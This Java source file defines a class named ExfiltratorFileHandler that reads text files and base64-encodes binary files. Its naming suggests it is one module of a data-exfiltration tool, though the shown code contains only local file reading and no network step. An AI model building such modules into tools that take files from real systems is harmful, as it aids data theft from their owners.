package modules.file;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.util.Base64;
import java.util.Scanner;

/**
    Responsible for the binary and text file IO.

    @author Str1k3r
    @version 1.0
*/
public class ExfiltratorFileHandler {

    /**
        Read contents of the text File specified.

        @param handle Identifies the file to read.

        @return Returns a string of the contents of the file.
    */
    public static String readTextFile(File handle) {

        try(Scanner reader = new Scanner(handle)) {
            StringBuilder builder = new StringBuilder();

            while(reader.hasNextLine()) {
                builder.append(reader.nextLine());
            }

            // return null if content is empty or whitespace
            return (!builder.toString().isBlank())? builder.toString(): null;
        }
        catch(FileNotFoundException fnfEx) {
            return null; // nothing to read, nothing to return
        }
    }

    /*
        Read specified binary file.

        @param handle Identifies the file to read.

        @return Return a base64 string of the contents of the file.
    */
    public static String readBinaryFile(File handle) {

        try(BufferedInputStream buffInStream = new BufferedInputStream(
                new FileInputStream(handle))) {

            StringBuilder builder = new StringBuilder();
            byte[] bytes = buffInStream.readAllBytes(); // convenient

            return Base64.getEncoder().encodeToString(bytes);
        }
        catch (Exception ex) { // FileNotFound and IO exceptions
            return null;
        }
    }
}
